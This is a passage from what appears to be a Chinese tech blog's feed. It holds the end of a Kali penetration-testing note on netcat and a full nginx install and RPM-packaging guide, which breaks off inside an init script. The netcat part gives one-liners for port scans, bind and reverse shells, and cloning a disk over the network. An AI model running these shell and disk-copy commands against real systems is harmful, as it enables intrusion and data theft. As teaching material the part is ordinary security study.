<h1 id="NC——端口口扫描"><a href="#NC——端口口扫描" class="headerlink" title="NC——端口口扫描"></a>NC——端口口扫描</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -nvz 1.1.1.1 1-65535</div><div class="line">nc –vnzu 1.1.1.1 1-1024</div></pre></td></tr></table></figure>
<h1 id="NC–远程克隆硬盘"><a href="#NC–远程克隆硬盘" class="headerlink" title="NC–远程克隆硬盘"></a>NC–远程克隆硬盘</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A: nc -lp 333 | dd of=/dev/sda</div><div class="line">B: dd <span class="keyword">if</span>=/dev/sda | nc -nv 1.1.1.1 333 –q 1</div></pre></td></tr></table></figure>
<h1 id="NC–远程控制"><a href="#NC–远程控制" class="headerlink" title="NC–远程控制"></a>NC–远程控制</h1><h2 id="正向"><a href="#正向" class="headerlink" title="正向:"></a>正向:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 -c bash</div><div class="line">B:nc 1.1.1.1 333</div></pre></td></tr></table></figure>
<h2 id="反向"><a href="#反向" class="headerlink" title="反向:"></a>反向:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333</div><div class="line">B:nc 1.1.1.1 333 -c bash</div></pre></td></tr></table></figure>
<p><strong> 注:Windows用用户把bash改成cmd </strong></p>
<h1 id="NC–NCAT"><a href="#NC–NCAT" class="headerlink" title="NC–NCAT"></a>NC–NCAT</h1><ul>
<li>Nc缺乏加密和身身份验证的能力力</li>
<li>Ncat包含于nmap工工具包中<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</div><div class="line">B:ncat -nv 1.1.1.1 333 --ssl</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;网络工工具中的瑞士士军刀刀——小小身身材、大大智慧&lt;/li&gt;
&lt;li&gt;侦听模式 / 传输模式&lt;/li&gt;
&lt;li&gt;telnet / 获取banner信息&lt;/li&gt;
&lt;li&gt;传输文文本信息&lt;/li&gt;
&lt;li&gt;传输文文件/⺫目目录&lt;/li&gt;
&lt;li&gt;加密传输文文件&lt;/li&gt;
&lt;li&gt;远程控制/木木⻢马&lt;/li&gt;
&lt;li&gt;加密所有流量&lt;/li&gt;
&lt;li&gt;流媒体服务器&lt;/li&gt;
&lt;li&gt;远程克隆硬盘&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="security" scheme="http://www.unix-like.com/categories/security/"/>
    
    
      <category term="Kali linux渗透测试" scheme="http://www.unix-like.com/tags/Kali-linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>nginx安装</title>
    <link href="http://www.unix-like.com/2017/06/12/service/nginx%E5%AE%89%E8%A3%85/"/>
    <id>http://www.unix-like.com/2017/06/12/service/nginx安装/</id>
    <published>2017-06-12T14:21:40.000Z</published>
    <updated>2017-06-12T14:33:31.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-rpm包安装"><a href="#一-rpm包安装" class="headerlink" title="一. rpm包安装"></a>一. rpm包安装</h1><h2 id="1-1-配置nginx-官方yum源用以安装最新稳定版"><a href="#1-1-配置nginx-官方yum源用以安装最新稳定版" class="headerlink" title="1.1 配置nginx 官方yum源用以安装最新稳定版"></a>1.1 配置nginx 官方yum源用以安装最新稳定版</h2><p>　　用以下内容为模板，创建nginx软件源文件: “/etc/yum.repos.d/nginx.repo” </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[nginx]</div><div class="line">name=nginx repo</div><div class="line">baseurl=http://nginx.org/packages/OS/OSRELEASE/$basearch/</div><div class="line">gpgcheck=0</div><div class="line">enabled=1</div></pre></td></tr></table></figure>
<p>　　其中“OS” 用 “centos”替代, 根据不同的系统版本， “OSRELEASE” 用“5”, “6”, 或者“7”替代</p>
<p>　　下面给出一个范例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[nginx]</div><div class="line">name=nginx repo</div><div class="line">baseurl=http://nginx.org/packages/centos/6/$basearch/</div><div class="line">gpgcheck=0</div><div class="line">enabled=1</div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="1-2-安装nginx"><a href="#1-2-安装nginx" class="headerlink" title="1.2 安装nginx"></a>1.2 安装nginx</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo yum install nginx</div></pre></td></tr></table></figure>
<h1 id="二-编译安装"><a href="#二-编译安装" class="headerlink" title="二. 编译安装"></a>二. 编译安装</h1><h2 id="2-1-必要软件准备"><a href="#2-1-必要软件准备" class="headerlink" title="2.1 必要软件准备"></a>2.1 必要软件准备</h2><h3 id="2-1-1-安装pcre"><a href="#2-1-1-安装pcre" class="headerlink" title="2.1.1 安装pcre"></a>2.1.1 安装pcre</h3><p>　　为了支持rewrite功能，我们需要安装pcre</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install pcre* //如过你已经装了，请跳过这一步</div></pre></td></tr></table></figure>
<h3 id="2-1-2-安装openssl"><a href="#2-1-2-安装openssl" class="headerlink" title="2.1.2 安装openssl"></a>2.1.2 安装openssl</h3><p>　　需要ssl的支持，如果不需要ssl支持，请跳过这一步</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install openssl*</div></pre></td></tr></table></figure>
<h2 id="2-2-安装nginx"><a href="#2-2-安装nginx" class="headerlink" title="2.2 安装nginx"></a>2.2 安装nginx</h2><h3 id="2-2-1-配置编译参数"><a href="#2-2-1-配置编译参数" class="headerlink" title="2.2.1 配置编译参数"></a>2.2.1 配置编译参数</h3><p>　　执行如下命令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx-1.5.1 \</div><div class="line">--with-http_ssl_module --with-http_spdy_module \</div><div class="line">--with-http_stub_status_module --with-pcre</div></pre></td></tr></table></figure>
<p>　　–with-http_stub_status_module：支持nginx状态查询</p>
<p>　　–with-http_ssl_module：支持https</p>
<p>　　–with-http_spdy_module：支持google的spdy,想了解请百度spdy,这个必须有ssl的支持</p>
<p>　　–with-pcre：为了支持rewrite重写功能，必须制定pcre</p>
<p>　　最后输出如下内容，表示configure OK了。</p>
<p>…</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">checking <span class="keyword">for</span> zlib library ... found</div><div class="line"> creating objs/Makefile</div><div class="line">Configuration summary</div><div class="line"> + using system PCRE library</div><div class="line"> + using system OpenSSL library</div><div class="line"> + md5: using OpenSSL library</div><div class="line"> + sha1: using OpenSSL library</div><div class="line"> + using system zlib library</div><div class="line">nginx path prefix: <span class="string">"/usr/local/nginx-1.5.1"</span></div><div class="line"> nginx binary file: <span class="string">"/usr/local/nginx-1.5.1/sbin/nginx"</span></div><div class="line"> nginx configuration prefix: <span class="string">"/usr/local/nginx-1.5.1/conf"</span></div><div class="line"> nginx configuration file: <span class="string">"/usr/local/nginx-1.5.1/conf/nginx.conf"</span></div><div class="line"> nginx pid file: <span class="string">"/usr/local/nginx-1.5.1/logs/nginx.pid"</span></div><div class="line"> nginx error <span class="built_in">log</span> file: <span class="string">"/usr/local/nginx-1.5.1/logs/error.log"</span></div><div class="line"> nginx http access <span class="built_in">log</span> file: <span class="string">"/usr/local/nginx-1.5.1/logs/access.log"</span></div><div class="line"> nginx http client request body temporary files: <span class="string">"client_body_temp"</span></div><div class="line"> nginx http proxy temporary files: <span class="string">"proxy_temp"</span></div><div class="line"> nginx http fastcgi temporary files: <span class="string">"fastcgi_temp"</span></div><div class="line"> nginx http uwsgi temporary files: <span class="string">"uwsgi_temp"</span></div><div class="line"> nginx http scgi temporary files: <span class="string">"scgi_temp"</span></div></pre></td></tr></table></figure>
<h3 id="2-2-2-编译nginx"><a href="#2-2-2-编译nginx" class="headerlink" title="2.2.2 编译nginx"></a>2.2.2 编译nginx</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">make //确定你的服务器有安装make，如果没有安装请执行yum install make</div></pre></td></tr></table></figure>
<h3 id="2-2-3-安装nginx"><a href="#2-2-3-安装nginx" class="headerlink" title="2.2.3 安装nginx"></a>2.2.3 安装nginx</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">make install</div></pre></td></tr></table></figure>
<h2 id="2-3-启动、关闭、重置nginx"><a href="#2-3-启动、关闭、重置nginx" class="headerlink" title="2.3 启动、关闭、重置nginx"></a>2.3 启动、关闭、重置nginx</h2><h3 id="2-3-1-启动：直接执行以下命令-nginx就启动了-不需要改任何配置文件-nginx配置多域名虚拟主机请参考后续文章"><a href="#2-3-1-启动：直接执行以下命令-nginx就启动了-不需要改任何配置文件-nginx配置多域名虚拟主机请参考后续文章" class="headerlink" title="2.3.1 启动：直接执行以下命令,nginx就启动了,不需要改任何配置文件,nginx配置多域名虚拟主机请参考后续文章."></a>2.3.1 启动：直接执行以下命令,nginx就启动了,不需要改任何配置文件,nginx配置多域名虚拟主机请参考后续文章.</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/<span class="built_in">local</span>/nginx-1.5.1/sbin/nginx</div></pre></td></tr></table></figure>
<p>　　试试访问：我这边不贴图，直接使用curl命令来读取web信息</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@ns conf]<span class="comment"># curl -s http://localhost | grep nginx.com</span></div><div class="line">nginx.com.</div></pre></td></tr></table></figure>
<h3 id="2-3-2-关闭："><a href="#2-3-2-关闭：" class="headerlink" title="2.3.2 关闭："></a>2.3.2 关闭：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/<span class="built_in">local</span>/nginx-1.5.1/sbin/nginx <span class="_">-s</span> stop</div></pre></td></tr></table></figure>
<h3 id="2-3-3-重置：当你有修改配置文件的时候，只需要reload以下即可"><a href="#2-3-3-重置：当你有修改配置文件的时候，只需要reload以下即可" class="headerlink" title="2.3.3 重置：当你有修改配置文件的时候，只需要reload以下即可"></a>2.3.3 重置：当你有修改配置文件的时候，只需要reload以下即可</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/<span class="built_in">local</span>/nginx-1.5.1/sbin/nginx <span class="_">-s</span> reload</div></pre></td></tr></table></figure>
<p>　　整个nginx的编译安装就到这里结束了。</p>
<h1 id="三-从源码打包成rpm包安装"><a href="#三-从源码打包成rpm包安装" class="headerlink" title="三. 从源码打包成rpm包安装"></a>三. 从源码打包成rpm包安装</h1><h2 id="3-1-RPM包的分类"><a href="#3-1-RPM包的分类" class="headerlink" title="3.1 RPM包的分类"></a>3.1 RPM包的分类</h2><p>　　RPM有五种基本的操作功能：安装、卸载、升级、查询和验证。</p>
<p>　　linux软件包分为两大类：</p>
<ol>
<li>二进制类包，包括rpm安装包（一般分为i386和x86等几种）</li>
<li>源码类包，源码包和开发包应该归位此类（.src.rpm）。</li>
</ol>
<p>　　有时候为了方便源码包的安装，和我们自己订制软件包的需求，我们会把一些源码包按照我们的需求来做成rpm包，当有了源码包就可以直接编译得到二进制安装包和其他任意包。spec file是制作rpm包最核心的部分，rpm包的制作就是根据spec file来实现的。在制作自定义rpm包的时候最好不要使用管理员进行,因为管理员权限过大，如果一个命令写错了，结果可能是灾难性的，而制件一个rpm包普通用户完全可以实现</p>
<h2 id="3-2-修改宏及自定义车间位置"><a href="#3-2-修改宏及自定义车间位置" class="headerlink" title="3.2 修改宏及自定义车间位置"></a>3.2 修改宏及自定义车间位置</h2><p>　　在redhat下，rpm包的默认制作路径在/usr/src/redhat下，这其中包含了6个目录（要求全部大写）</p>
<table>
<thead>
<tr>
<th>Directory</th>
<th>Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td>BUILD</td>
<td>源代码解压以后放的位置，只需提供BUILD目录，具体里面放什么，不用我们管，所以真正的制作车间是BUILD目录</td>
</tr>
<tr>
<td>RPMS</td>
<td>制作完成后的rpm包存放目录，为特定平台指定子目录（i386,i686,ppc）</td>
</tr>
<tr>
<td>SOURCES</td>
<td>收集的源文件，源材料，补丁文件等存放位置</td>
</tr>
<tr>
<td>SPECS</td>
<td>存放spec文件，作为制作rpm包的领岗文件，以 rpm名.spec</td>
</tr>
<tr>
<td>SRPMS</td>
<td>src格式的rpm包位置 ，既然是src格式的包，就没有平台的概念了</td>
</tr>
<tr>
<td>BuiltRoot</td>
<td>假根，使用install临时安装到这个目录，把这个目录当作根来用的，所以在这个目录下的目录文件，才是真正的目录文件。当打包完成后，在清理阶段，这个目录将被删除</td>
</tr>
</tbody>
</table>
<p>　　但centos并没有该目录，因此，我们不得不自定义工作车间，即使在redhat下有该目录，一般也是自定义到普通用户的家目录下的。</p>
<p>　　<code>rpmbuild --showrc</code> 显示所有的宏，以下划线开头，一个下划线：定义环境的使用情况，二个下划线：通常定义的是命令，为什么要定义宏，因为不同的系统，命令的存放位置可能不同，所以通过宏的定义找到命令的真正存放位置。</p>
<p>　　查看默认工作车间，所以只要改变了这个宏，我们就可以自定义工作车间了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># rpmbuild --showrc | grep topdir</span></div><div class="line">-14: _builddir	%&#123;_topdir&#125;/BUILD</div><div class="line">-14: _buildrootdir	%&#123;_topdir&#125;/BUILDROOT</div><div class="line">-14: _rpmdir	%&#123;_topdir&#125;/RPMS</div><div class="line">-14: _sourcedir	%&#123;_topdir&#125;/SOURCES</div><div class="line">-14: _specdir	%&#123;_topdir&#125;/SPECS</div><div class="line">-14: _srcrpmdir	%&#123;_topdir&#125;/SRPMS</div><div class="line">-14: _topdir	%&#123;getenv:HOME&#125;/rpmbuild</div></pre></td></tr></table></figure>
<h2 id="3-3-rpm包制作原理图"><a href="#3-3-rpm包制作原理图" class="headerlink" title="3.3 rpm包制作原理图"></a>3.3 rpm包制作原理图</h2><p><a><img src="../../images/service/nginx/1-1.jpg"></a></p>
<h2 id="3-4-制作rpm包"><a href="#3-4-制作rpm包" class="headerlink" title="3.4 制作rpm包"></a>3.4 制作rpm包</h2><h3 id="3-4-1-安装rpm-build"><a href="#3-4-1-安装rpm-build" class="headerlink" title="3.4.1 安装rpm-build"></a>3.4.1 安装rpm-build</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install rpm-build</div></pre></td></tr></table></figure>
<h3 id="3-4-2-增加普通用户并修改工作车间目录"><a href="#3-4-2-增加普通用户并修改工作车间目录" class="headerlink" title="3.4.2 增加普通用户并修改工作车间目录"></a>3.4.2 增加普通用户并修改工作车间目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># useradd hero</span></div><div class="line"></div><div class="line"><span class="comment"># su - hero</span></div><div class="line"></div><div class="line">$ vim ~/.rpmmacros</div><div class="line"></div><div class="line">%_topdir        /home/hero/rpmbuild</div><div class="line"></div><div class="line"><span class="comment"># mkdir -pv ~/rpmbuild/&#123;BUILD,RPMS,SOURCES,SPECS,SRPMS&#125;</span></div><div class="line"></div><div class="line"><span class="comment"># rpmbuild --showrc | grep _topdir    #会发现，工作车间已然改变：_topdir    /home/hero/rpmbuild</span></div></pre></td></tr></table></figure>
<h3 id="3-4-3-收集源码文件"><a href="#3-4-3-收集源码文件" class="headerlink" title="3.4.3 收集源码文件"></a>3.4.3 收集源码文件</h3><h4 id="3-4-3-1-文件列表"><a href="#3-4-3-1-文件列表" class="headerlink" title="3.4.3.1 文件列表"></a>3.4.3.1 文件列表</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@localhost SOURCES]<span class="comment"># pwd</span></div><div class="line">/home/hero/rpmbuild/SOURCES</div><div class="line">[root@localhost SOURCES]<span class="comment"># ls</span></div><div class="line">fastcgi_params  nginx  nginx-1.8.1.tar.gz  nginx.conf</div></pre></td></tr></table></figure>
<h4 id="3-4-3-2-nginx-1-8-1-tar-gz-源码包"><a href="#3-4-3-2-nginx-1-8-1-tar-gz-源码包" class="headerlink" title="3.4.3.2 nginx-1.8.1.tar.gz 源码包"></a>3.4.3.2 nginx-1.8.1.tar.gz 源码包</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cp /opt/src/nginx-1.8.1.tar.gz /home/hero/rpmbuild/SOURCES/</div></pre></td></tr></table></figure>
<h4 id="3-4-3-3-nginx启动脚本文件"><a href="#3-4-3-3-nginx启动脚本文件" class="headerlink" title="3.4.3.3 nginx启动脚本文件"></a>3.4.3.3 nginx启动脚本文件</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># nginx        Startup script for nginx</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># chkconfig: - 85 15</span></div><div class="line"><span class="comment"># processname: nginx</span></div><div class="line"><span class="comment"># config: /etc/nginx/nginx.conf</span></div><div class="line"><span class="comment"># config: /etc/sysconfig/nginx</span></div><div class="line"><span class="comment"># pidfile: /var/run/nginx.pid</span></div><div class="line"><span class="comment"># description: nginx is an HTTP and reverse proxy server</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">### BEGIN INIT INFO</span></div><div class="line"><span class="comment"># Provides: nginx</span></div><div class="line"><span class="comment"># Required-Start: $local_fs $remote_fs $network</span></div><div class="line"><span class="comment"># Required-Stop: $local_fs $remote_fs $network</span></div><div class="line"><span class="comment"># Default-Start: 2 3 4 5</span></div><div class="line"><span class="comment"># Default-Stop: 0 1 6</span></div><div class="line"><span class="comment"># Short-Description: start and stop nginx</span></div><div class="line"><span class="comment">### END INIT INFO</span></div><div class="line"></div><div class="line"><span class="comment"># Source function library.</span></div><div class="line">. /etc/rc.d/init.d/<span class="built_in">functions</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ -L <span class="variable">$0</span> ]; <span class="keyword">then</span></div><div class="line">    initscript=`/bin/readlink <span class="_">-f</span> <span class="variable">$0</span>`</div><div class="line"><span class="keyword">else</span></div><div class="line">    initscript=<span class="variable">$0</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">sysconfig=`/bin/basename <span class="variable">$initscript</span>`</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="_">-f</span> /etc/sysconfig/<span class="variable">$sysconfig</span> ]; <span class="keyword">then</span></div><div class="line">    . /etc/sysconfig/<span class="variable">$sysconfig</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">nginx=<span class="variable">$&#123;NGINX-/gotwo_data/Application/nginx/sbin/nginx&#125;</span></div><div class="line">prog=`/bin/basename <span class="variable">$nginx</span>`</div><div class="line">conffile=<span class="variable">$&#123;CONFFILE-/gotwo_data/Application/nginx/conf/nginx.conf&#125;</span></div><div class="line">lockfile=<span class="variable">$&#123;LOCKFILE-/gotwo_data/logs/nginx/nginx.lock&#125;</span></div><div class="line">pidfile=<span class="variable">$&#123;PIDFILE-/gotwo_data/logs/nginx/nginx.pid&#125;</span></div><div class="line">SLEEPMSEC=<span class="variable">$&#123;SLEEPMSEC-200000&#125;</span></div><div class="line">UPGRADEWAITLOOPS=<span class="variable">$&#123;UPGRADEWAITLOOPS-5&#125;</span></div><div class="line">RETVAL=0</div><div class="line"></div><div class="line"><span class="function"><span class="title">start</span></span>() &#123;</div><div class="line">    <span class="built_in">echo</span> -n $<span class="string">"Starting <span class="variable">$prog</span>: "</span></div><div class="line"></div><div class="line">    daemon --pidfile=<span class="variable">$&#123;pidfile&#125;</span> <span class="variable">$&#123;nginx&#125;</span> -c <span class="variable">$&#123;conffile&#125;</span></div><div class="line">    RETVAL=$?</div><div class="line">    <span class="built_in">echo</span></div><div class="line">    [ <span class="variable">$RETVAL</span> = 0 ] &amp;&amp; touch <span class="variable">$&#123;lockfile&#125;</span></div><div class="line">    <span class="built_in">return</span> <span class="variable">$RETVAL</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">stop</span></span>() &#123;</div><div class="line">    <span class="built_in">echo</span> -n $<span class="string">"Stopping <span class="variable">$prog</span>: "</span></div><div class="line">    killproc -p <span class="variable">$&#123;pidfile&#125;</span> <span class="variable">$&#123;prog&#125;</span></div><div class="line">    RETVAL=$?</div><div class="line">    <span class="built_in">echo</span></div><div class="line">    [ <span class="variable">$RETVAL</span> = 0 ] &amp;&amp; rm <span class="_">-f</span> <span class="variable">$&#123;lockfile&#125;</span> <span class="variable">$&#123;pidfile&#125;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">reload</span></span>() &#123;</div><div class="line">    <span class="built_in">echo</span> -n $<span class="string">"Reloading <span class="variable">$prog</span>: "</span></div><div class="line">    killproc -p <span class="variable">$&#123;pidfile&#125;</span> <span class="variable">$&#123;prog&#125;</span> -HUP</div><div class="line">    RETVAL=$?</div><div class="line">    <span class="built_in">echo</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">upgrade</span></span>() &#123;</div><div class="line">    oldbinpidfile=<span class="variable">$&#123;pidfile&#125;</span>.oldbin</div><div class="line"></div><div class="line">    configtest -q || <span class="built_in">return</span></div><div class="line">    <span class="built_in">echo</span> -n $<span class="string">"Starting new master <span class="variable">$prog</span>: "</span></div><div class="line">    killproc -p <span class="variable">$&#123;pidfile&#125;</span> <span class="variable">$&#123;prog&#125;</span> -USR2</div><div class="line">    <span class="built_in">echo</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> `/usr/bin/seq <span class="variable">$UPGRADEWAITLOOPS</span>`; <span class="keyword">do</span></div><div class="line">        /bin/usleep <span class="variable">$SLEEPMSEC</span></div><div class="line">        <span class="keyword">if</span> [ <span class="_">-f</span> <span class="variable">$&#123;oldbinpidfile&#125;</span> <span class="_">-a</span> <span class="_">-f</span> <span class="variable">$&#123;pidfile&#125;</span> ]; <span class="keyword">then</span></div><div class="line">            <span class="built_in">echo</span> -n $<span class="string">"Graceful shutdown of old <span class="variable">$prog</span>: "</span></div><div class="line">            killproc -p <span class="variable">$&#123;oldbinpidfile&#125;</span> <span class="variable">$&#123;prog&#125;</span> -QUIT</div><div class="line">            RETVAL=$?</div><div class="line">            <span class="built_in">echo</span></div><div class="line">            <span class="built_in">return</span></div><div class="line">        <span class="keyword">fi</span></div><div class="line">    <span class="keyword">done</span></div><div class="line"></div><div class="line">    <span class="built_in">echo</span> $<span class="string">"Upgrade failed!"</span></div><div class="line">    RETVAL=1</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">configtest</span></span>() &#123;</div><div class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$#</span>"</span> <span class="_">-ne</span> 0 ] ; <span class="keyword">then</span></div><div class="line">        <span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">            -q)</div><div class="line">                FLAG=<span class="variable">$1</span></div><div class="line">                ;;</div><div class="line">            *)</div><div class="line">                ;;</div><div class="line">        <span class="keyword">esac</span></div><div class="line">        <span class="built_in">shift</span></div><div class="line">    <span class="keyword">fi</span></div><div class="line">    <span class="variable">$&#123;nginx&#125;</span> -t -c <span class="variable">$&#123;conffile&#125;</span> <span class="variable">$FLAG</span></div><div class="line">    RETVAL=$?</div><div class="line">    <span class="built_in">return</span> <span class="variable">$RETVAL</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">rh_status</span></span>() &#123;</div><div class="line">    status -p <span class="variable">$&#123;pidfile&#125;</span> <span class="variable">$&#123;nginx&#125;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># See how we were called.</span></div><div class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">    start)</div><div class="line">        rh_status &gt;/dev/null 2&gt;&amp;1 &amp;&amp; <span class="built_in">exit</span> 0</div><div class="line">        start</div><div class="line">        ;;</div><div class="line">    stop)</div><div class="line">        stop</div><div class="line">        ;;</div><div class="line">    status)</div><div class="line">        rh_status</div><div class="line">        RETVAL=$?</div><div class="line">        ;;</div><div class="line">    restart)</div><div class="line">        configtest -q || <span class="built_in">exit</span> <span class="variable">$RETVAL</span></div><div class="line">        stop</div><div class="line">        start</div><div class="line">        ;;</div><div class="line">    upgrade)</div><div class="line">        rh_status &gt;/dev/null 2&gt;&amp;1 || <span class="built_in">exit</span> 0</div><div class="line">        upgrade</div><div class="line">        ;;</div><div class="line">    condrestart|try-restart)</div><div class="line">        <span class="keyword">if</span> rh_status &gt;/dev/null 2&gt;&amp;1; <span class="keyword">then</span></div><div class="line">            stop</div><div class="line">            start</div><div class="line">        <span class="keyword">fi</span></div><div class="line">        ;;</div><div class="line">    force-reload|reload)</div><div class="line">        reload</div><div class="line">        ;;</div><div 